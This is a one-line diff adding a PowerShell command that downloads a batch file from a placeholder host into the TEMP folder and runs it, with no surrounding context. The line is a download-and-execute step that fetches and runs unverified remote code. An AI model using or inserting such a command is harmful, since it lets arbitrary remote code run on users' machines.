@@ -1,0 +1,1 @@
+powershell -Command "& {Invoke-WebRequest 'https://your-link.com/script.bat' -OutFile $env:TEMP\script.bat; Start-Process -FilePath $env:TEMP\script.bat -Wait}"
